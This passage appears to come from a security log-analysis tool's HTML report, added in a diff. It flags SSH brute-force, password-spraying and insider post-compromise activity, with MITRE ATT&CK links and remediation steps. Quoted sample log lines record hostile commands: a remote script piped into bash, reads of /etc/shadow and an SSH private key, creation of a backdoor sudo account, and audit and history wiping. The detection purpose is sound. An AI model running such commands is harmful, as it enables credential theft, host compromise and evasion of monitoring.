+Aug 10 14:31:08 web01 sshd[3122]: <b>Failed password</b> for carol from 203.0.113.45 port 60134 ssh2</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Identify what produced the spike (source IP, service, error text)</li><li>Compare the rate against a normal day for this host</li><li>Check for other alerts inside the same minute</li></ol></div><footer><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1499/" title="Open this technique on attack.mitre.org">T1499 Endpoint Denial of Service (possible)</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:5"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 11h14v10H5zM8 11V7a4 4 0 018 0v4"/></svg>Medium</span><h3>Failed login burst from 198.51.100.77</h3></header><p>8 failed logins from 198.51.100.77 inside one minute (8 in total). A person mistypes a password two or three times, not 8. This is automated.</p><pre><code>Aug 10 14:22:01 web01 sshd[3001]: <b>Failed password</b> for <b>invalid user</b> admin from <mark>198.51.100.77</mark> port 33012 ssh2
+Aug 10 14:22:03 web01 sshd[3002]: <b>Failed password</b> for <b>invalid user</b> root from <mark>198.51.100.77</mark> port 33018 ssh2
+Aug 10 14:22:05 web01 sshd[3003]: <b>Failed password</b> for <b>invalid user</b> test from <mark>198.51.100.77</mark> port 33024 ssh2</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Rate-limit or block 198.51.100.77</li><li>Confirm no login from this IP ever succeeded</li><li>Check that account lockout is switched on</li></ol></div><footer><span class="tag">198.51.100.77</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1110/001/" title="Open this technique on attack.mitre.org">T1110.001 Brute Force: Password Guessing</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:6"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M17 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2M9.5 7a3.5 3.5 0 107 0 3.5 3.5 0 10-7 0M23 21v-2a4 4 0 00-3-3.9"/></svg>Medium</span><h3>One source probing many accounts (198.51.100.90)</h3></header><p>198.51.100.90 tried 4 different usernames (carol, elastic, ftpuser, tomcat). Spreading attempts across accounts is password spraying or credential stuffing - it is designed to stay under the lockout threshold on any single account.</p><pre><code>Aug 10 14:24:40 web01 sshd[3040]: <b>Failed password</b> for <b>invalid user</b> <mark>tomcat</mark> from <mark>198.51.100.90</mark> port 41002 ssh2
+Aug 10 14:24:44 web01 sshd[3041]: <b>Failed password</b> for <b>invalid user</b> <mark>elastic</mark> from <mark>198.51.100.90</mark> port 41008 ssh2
+Aug 10 14:24:48 web01 sshd[3042]: <b>Failed password</b> for <b>invalid user</b> <mark>ftpuser</mark> from <mark>198.51.100.90</mark> port 41014 ssh2</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Block 198.51.100.90 and check its reputation before unblocking</li><li>Check each named account for a successful login</li><li>Ban the usernames that do not exist on this host at the edge</li></ol></div><footer><span class="tag">198.51.100.90</span><span class="tag">carol</span><span class="tag">elastic</span><span class="tag">ftpuser</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1110/003/" title="Open this technique on attack.mitre.org">T1110.003 Brute Force: Password Spraying</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:7"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M11 3a8 8 0 100 16 8 8 0 000-16zM21 21l-4.35-4.35"/></svg>Medium</span><h3>Username enumeration campaign (11 names, 2 sources)</h3></header><p>11 usernames that do not exist on this host were tried from 2 different IPs. Attackers do this first to learn which accounts are real before spending attempts on passwords.</p><pre><code>Aug 10 14:22:01 web01 sshd[3001]: <b>Failed password</b> for <b>invalid user</b> <mark>admin</mark> from <mark>198.51.100.77</mark> port 33012 ssh2
+Aug 10 14:22:03 web01 sshd[3002]: <b>Failed password</b> for <b>invalid user</b> <mark>root</mark> from <mark>198.51.100.77</mark> port 33018 ssh2
+Aug 10 14:22:05 web01 sshd[3003]: <b>Failed password</b> for <b>invalid user</b> <mark>test</mark> from <mark>198.51.100.77</mark> port 33024 ssh2</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Make failed logins respond identically for real and fake users</li><li>Block the sources and watch for follow-up attempts on real accounts</li><li>Alert when invalid-user failures exceed a daily baseline</li></ol></div><footer><span class="tag">198.51.100.77</span><span class="tag">198.51.100.90</span><span class="tag">admin</span><span class="tag">elastic</span><span class="tag">ftpuser</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1087/" title="Open this technique on attack.mitre.org">T1087 Account Discovery</a></footer></article>
+</div>
+<aside class="side" aria-label="Summary and export"><div class="card gauge-card risk-high"><svg class="gauge" viewBox="0 0 120 74" role="img" aria-label="Risk score 100 of 100, level High"><path d="M14 62a46 46 0 0192 0" fill="none" stroke="var(--card-2)" stroke-width="11" stroke-linecap="round"/><path d="M14 62a46 46 0 0192 0" fill="none" stroke="currentColor" stroke-width="11" stroke-linecap="round" stroke-dasharray="144.5" stroke-dashoffset="0.0"/><text x="60" y="54" class="g-num">100</text><text x="60" y="70" class="g-lab">HIGH RISK</text></svg><div class="bars"><div class="brow"><span class="blab risk-high">High</span><span class="btrack"><i class="bfill sev-bg-High" style="width:50%"></i></span><b>4</b></div><div class="brow"><span class="blab risk-medium">Medium</span><span class="btrack"><i class="bfill sev-bg-Medium" style="width:50%"></i></span><b>4</b></div><div class="brow"><span class="blab risk-low">Low</span><span class="btrack"><i class="bfill sev-bg-Low" style="width:0%"></i></span><b>0</b></div></div></div><div class="card"><h3><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zM2 12h20M12 2a15 15 0 010 20 15 15 0 010-20z"/></svg>Top sources</h3><div class="scroll"><table class="mini"><thead><tr><th>IP</th><th>Ev</th><th>Fail</th><th></th></tr></thead><tbody><tr><td class="mono">203.0.113.45</td><td>16</td><td>15</td><td><span class="verdict bad"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>flagged</span></td></tr><tr><td class="mono">198.51.100.77</td><td>8</td><td>8</td><td><span class="verdict bad"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>flagged</span></td></tr><tr><td class="mono">10.0.0.14</td><td>4</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">10.0.0.31</td><td>4</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">198.51.100.90</td><td>4</td><td>4</td><td><span class="verdict bad"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>flagged</span></td></tr><tr><td class="mono">10.0.0.9</td><td>3</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">10.0.0.21</td><td>2</td><td>1</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">192.0.2.31</td><td>2</td><td>2</td><td><span class="verdict bad"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>flagged</span></td></tr></tbody></table></div></div></aside>
+</div>
+</div>
+<h2 class="section-h"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg> Report 2 &mdash; Insider / post-compromise</h2><p class="lede" style="font-size:15px">Off-hours login, credential file reads, a backdoor account, then the log cleared. Source file: <code>samples/insider.log</code></p><div id="results2" tabindex="-1">
+<div class="statusbar"><span class="pill risk-high"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2 4 5v6c0 5 3.4 9.3 8 11 4.6-1.7 8-6 8-11V5l-8-3z"/></svg>High risk</span><span class="sb-item"><b>8</b> findings</span><span class="sb-item"><b>30</b> events</span><span class="sb-item"><b>0</b> failed</span><span class="sb-item"><b>4</b> source IPs</span><span class="sb-item">27h 2m</span></div>
+<figure class="chart"><figcaption><span class="cap"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>Event timeline</span><span class="legend"><i class="k-fail"></i>failed<i class="k-ok"></i>accepted<i class="k-other"></i>other</span></figcaption><svg viewBox="0 0 100 96" preserveAspectRatio="none" role="img" aria-label="Event volume over time, peak 12 events per 60min"><g><title>08:47 - 4 events (0 failed, 3 accepted)</title><rect class="b-other" x="0.140" y="88.00" width="3.291" height="8.00" rx="0.15"/><rect class="b-ok" x="0.140" y="64.00" width="3.291" height="24.00" rx="0.15"/></g><g><title>09:47 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="3.711" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>10:47 - 2 events (0 failed, 1 accepted)</title><rect class="b-other" x="7.283" y="88.00" width="3.291" height="8.00" rx="0.15"/><rect class="b-ok" x="7.283" y="80.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>11:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="10.854" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>12:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="14.426" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>13:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="17.997" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>15:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="25.140" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>16:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="28.711" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>17:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="32.283" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>01:47 - 12 events (0 failed, 2 accepted)</title><rect class="b-other" x="60.854" y="16.00" width="3.291" height="80.00" rx="0.15"/><rect class="b-ok" x="60.854" y="0.00" width="3.291" height="16.00" rx="0.15"/></g><g><title>07:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="82.283" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>08:47 - 2 events (0 failed, 1 accepted)</title><rect class="b-other" x="85.854" y="88.00" width="3.291" height="8.00" rx="0.15"/><rect class="b-ok" x="85.854" y="80.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>09:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="89.426" y="88.00" width="3.291" height="8.00" rx="0.15"/></g><g><title>11:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="96.569" y="88.00" width="3.291" height="8.00" rx="0.15"/></g></svg><div class="axis"><span>Aug 12 08:47</span><span>1 bar = 60min</span><span>Aug 13 11:50</span></div><details class="datatable"><summary>Show the numbers</summary><div class="scroll"><table><thead><tr><th>Time</th><th>Failed</th><th>Accepted</th><th>Other</th><th>Total</th></tr></thead><tbody><tr><td class="mono">Aug 12 08:47</td><td>0</td><td>3</td><td>1</td><td>4</td></tr><tr><td class="mono">Aug 12 09:47</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 12 10:47</td><td>0</td><td>1</td><td>1</td><td>2</td></tr><tr><td class="mono">Aug 12 11:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 12 12:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 12 13:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 12 15:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 12 16:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 12 17:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 13 01:47</td><td>0</td><td>2</td><td>10</td><td>12</td></tr><tr><td class="mono">Aug 13 07:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 13 08:47</td><td>0</td><td>1</td><td>1</td><td>2</td></tr><tr><td class="mono">Aug 13 09:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 13 11:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr></tbody></table></div></details></figure>
+<div class="grid">
+<div class="col-main">
+<article class="card sev-High" data-sev="High" style="--i:0"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 6h18M8 6V4h8v2M6 6l1 14h10l1-14"/></svg>High</span><h3>Log clearing or logging service stopped</h3></header><p>The log records its own truncation or a logging service being stopped. This is what an intruder does after acting, and it means the events you are looking at are probably incomplete.</p><pre><code>Aug 13 02:21:52 db01 rsyslogd: [origin software=&quot;rsyslogd&quot;] rsyslogd was HUPed, <b>log file cleared</b></code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Preserve a copy of the current logs before anything else</li><li>Pull the same period from your central log server, not this host</li><li>Treat the host as untrusted until reviewed</li></ol></div><footer><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1070/002/" title="Open this technique on attack.mitre.org">T1070.002 Indicator Removal: Clear Linux or Mac System Logs</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:1"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 17l6-6-6-6M12 19h8"/></svg>High</span><h3>Sensitive activity: credential file access</h3></header><p>2 log line(s) show credential file access by dbadmin. On a normal day this appears during planned admin work and nowhere else. Outside a change window it is one of the strongest signals that someone is already inside.</p><pre><code>Aug 13 02:13:41 db01 sudo: <mark>dbadmin</mark> : TTY=pts/3 ; PWD=/root ; <b>COMMAND=/usr/bin/cat</b> /etc/shadow
+Aug 13 02:14:07 db01 sudo: <mark>dbadmin</mark> : TTY=pts/3 ; PWD=/root ; <b>COMMAND=/usr/bin/cat</b> /home/helen/.ssh/id_rsa</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Match this against an approved change or ticket</li><li>Ask the account owner directly - do not assume it was them</li><li>If unexplained, isolate the host and preserve the logs now</li></ol></div><footer><span class="tag">dbadmin</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1003/008/" title="Open this technique on attack.mitre.org">T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:2"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 17l6-6-6-6M12 19h8"/></svg>High</span><h3>Sensitive activity: destructive or anti-forensic command</h3></header><p>1 log line(s) show destructive or anti-forensic command by dbadmin. On a normal day this appears during planned admin work and nowhere else. Outside a change window it is one of the strongest signals that someone is already inside.</p><pre><code>Aug 13 02:22:30 db01 sudo: <mark>dbadmin</mark> : TTY=pts/3 ; PWD=/root ; <b>COMMAND=/bin/bash</b> -c history -c</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Match this against an approved change or ticket</li><li>Ask the account owner directly - do not assume it was them</li><li>If unexplained, isolate the host and preserve the logs now</li></ol></div><footer><span class="tag">dbadmin</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1070/" title="Open this technique on attack.mitre.org">T1070 Indicator Removal</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:3"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 17l6-6-6-6M12 19h8"/></svg>High</span><h3>Sensitive activity: new account or privilege grant</h3></header><p>2 log line(s) show new account or privilege grant by dbadmin. On a normal day this appears during planned admin work and nowhere else. Outside a change window it is one of the strongest signals that someone is already inside.</p><pre><code>Aug 13 02:15:22 db01 sudo: <mark>dbadmin</mark> : TTY=pts/3 ; PWD=/root ; <b>COMMAND=/usr/sbin/useradd</b> -m -s /bin/bash svc_monitor
+Aug 13 02:15:48 db01 sudo: <mark>dbadmin</mark> : TTY=pts/3 ; PWD=/root ; <b>COMMAND=/usr/sbin/usermod</b> -aG sudo svc_monitor</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Match this against an approved change or ticket</li><li>Ask the account owner directly - do not assume it was them</li><li>If unexplained, isolate the host and preserve the logs now</li></ol></div><footer><span class="tag">dbadmin</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1136/001/" title="Open this technique on attack.mitre.org">T1136.001 Create Account: Local Account</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:4"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 17l6-6-6-6M12 19h8"/></svg>High</span><h3>Sensitive activity: permission weakening</h3></header><p>1 log line(s) show permission weakening by dbadmin. On a normal day this appears during planned admin work and nowhere else. Outside a change window it is one of the strongest signals that someone is already inside.</p><pre><code>Aug 13 02:17:04 db01 sudo: <mark>dbadmin</mark> : TTY=pts/3 ; PWD=/var/www ; <b>COMMAND=/usr/bin/chmod</b> 777 /var/www/uploads</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Match this against an approved change or ticket</li><li>Ask the account owner directly - do not assume it was them</li><li>If unexplained, isolate the host and preserve the logs now</li></ol></div><footer><span class="tag">dbadmin</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1222/" title="Open this technique on attack.mitre.org">T1222 File and Directory Permissions Modification</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:5"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 17l6-6-6-6M12 19h8"/></svg>High</span><h3>Sensitive activity: remote script piped to a shell</h3></header><p>1 log line(s) show remote script piped to a shell by dbadmin. On a normal day this appears during planned admin work and nowhere else. Outside a change window it is one of the strongest signals that someone is already inside.</p><pre><code>Aug 13 02:19:30 db01 sudo: <mark>dbadmin</mark> : TTY=pts/3 ; PWD=/tmp ; <b>COMMAND=/bin/sh</b> -c curl -s http://<mark>45.77.201.14</mark>/x.sh | bash</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Match this against an approved change or ticket</li><li>Ask the account owner directly - do not assume it was them</li><li>If unexplained, isolate the host and preserve the logs now</li></ol></div><footer><span class="tag">45.77.201.14</span><span class="tag">dbadmin</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1059/004/" title="Open this technique on attack.mitre.org">T1059.004 Command and Scripting Interpreter: Unix Shell</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:6"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 17l6-6-6-6M12 19h8"/></svg>High</span><h3>Sensitive activity: security service disabled</h3></header><p>1 log line(s) show security service disabled by dbadmin. On a normal day this appears during planned admin work and nowhere else. Outside a change window it is one of the strongest signals that someone is already inside.</p><pre><code>Aug 13 02:21:15 db01 sudo: <mark>dbadmin</mark> : TTY=pts/3 ; PWD=/tmp ; <b>COMMAND=/usr/bin/systemctl</b> stop auditd</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Match this against an approved change or ticket</li><li>Ask the account owner directly - do not assume it was them</li><li>If unexplained, isolate the host and preserve the logs now</li></ol></div><footer><span class="tag">dbadmin</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1562/001/" title="Open this technique on attack.mitre.org">T1562.001 Impair Defenses: Disable or Modify Tools</a></footer></article>
+<article class="card sev-Low" data-sev="Low" style="--i:7"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 5v5l3 2"/></svg>Low</span><h3>2 successful login(s) outside working hours</h3></header><p>Logins succeeded between 22:00 and 05:00 for dbadmin, user. Attackers use stolen credentials when nobody is watching. Legitimate night work exists - confirm it with the account owner rather than assuming either way.</p><pre><code>Aug 13 02:11:53 db01 sshd[3012]: <b>Accepted password</b> for <mark>dbadmin</mark> from <mark>45.77.201.14</mark> port 58022 ssh2
+Aug 13 02:12:09 db01 sshd[3012]: <b>session opened</b> for <mark>user</mark> <mark>dbadmin</mark></code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Confirm the activity with the account owner</li><li>Compare against that user&#x27;s normal login hours and source IPs</li><li>Alert on out-of-hours logins for privileged accounts</li></ol></div><footer><span class="tag">45.77.201.14</span><span class="tag">dbadmin</span><span class="tag">user</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1078/" title="Open this technique on attack.mitre.org">T1078 Valid Accounts</a></footer></article>
+</div>
+<aside class="side" aria-label="Summary and export"><div class="card gauge-card risk-high"><svg class="gauge" viewBox="0 0 120 74" role="img" aria-label="Risk score 100 of 100, level High"><path d="M14 62a46 46 0 0192 0" fill="none" stroke="var(--card-2)" stroke-width="11" stroke-linecap="round"/><path d="M14 62a46 46 0 0192 0" fill="none" stroke="currentColor" stroke-width="11" stroke-linecap="round" stroke-dasharray="144.5" stroke-dashoffset="0.0"/><text x="60" y="54" class="g-num">100</text><text x="60" y="70" class="g-lab">HIGH RISK</text></svg><div class="bars"><div class="brow"><span class="blab risk-high">High</span><span class="btrack"><i class="bfill sev-bg-High" style="width:88%"></i></span><b>7</b></div><div class="brow"><span class="blab risk-medium">Medium</span><span class="btrack"><i class="bfill sev-bg-Medium" style="width:0%"></i></span><b>0</b></div><div class="brow"><span class="blab risk-low">Low</span><span class="btrack"><i class="bfill sev-bg-Low" style="width:12%"></i></span><b>1</b></div></div></div><div class="card"><h3><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zM2 12h20M12 2a15 15 0 010 20 15 15 0 010-20z"/></svg>Top sources</h3><div class="scroll"><table class="mini"><thead><tr><th>IP</th><th>Ev</th><th>Fail</th><th></th></tr></thead><tbody><tr><td class="mono">10.0.0.35</td><td>4</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">10.0.0.23</td><td>3</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">10.0.0.9</td><td>3</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">45.77.201.14</td><td>2</td><td>0</td><td><span class="verdict bad"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>flagged</span></td></tr></tbody></table></div></div></aside>
+</div>
+</div>
+<h2 class="section-h"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg> Report 3 &mdash; Web application attack</h2><p class="lede" style="font-size:15px">Scanner sweep, SQL injection, and a path traversal that came back 200. Source file: <code>samples/web_attack.log</code></p><div id="results3" tabindex="-1">
+<div class="statusbar"><span class="pill risk-high"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2 4 5v6c0 5 3.4 9.3 8 11 4.6-1.7 8-6 8-11V5l-8-3z"/></svg>High risk</span><span class="sb-item"><b>7</b> findings</span><span class="sb-item"><b>33</b> events</span><span class="sb-item"><b>10</b> failed</span><span class="sb-item"><b>7</b> source IPs</span><span class="sb-item">3h 30m</span></div>
